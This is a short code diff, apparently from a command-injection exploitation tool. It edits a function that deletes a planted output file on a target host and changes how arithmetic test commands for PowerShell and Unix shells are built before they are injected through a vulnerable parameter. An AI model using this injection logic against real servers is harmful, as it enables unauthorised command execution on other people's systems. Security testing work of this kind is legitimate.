@@ -53,10 +53,9 @@ def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespa
     debug_msg = "Deleting the generated file '" + OUTPUT_TEXTFILE + "'"
     print(settings.print_debug_msg(debug_msg))
   if settings.TARGET_OS == "win":
-    cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE
+    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
   else:
-    settings.WEB_ROOT = ""
-    cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT 
+    cmd = settings.DEL + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT 
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
 
 """
@@ -271,7 +270,8 @@ def tfb_injection_handler(url, timesec, filename, tmp_path, http_request_method,
                         if alter_shell:
                           cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                         else:
-                          cmd = "powershell.exe -InputFormat none write (" + str(randv1) + " + " + str(randv2) + ")"
+                          rand_num = randv1 + randv2
+                          cmd = "powershell.exe -InputFormat none write (" + str(rand_num) + ")"
                       else:
                         cmd = "echo $((" + str(randv1) + " %2B " + str(randv2) + "))"
 
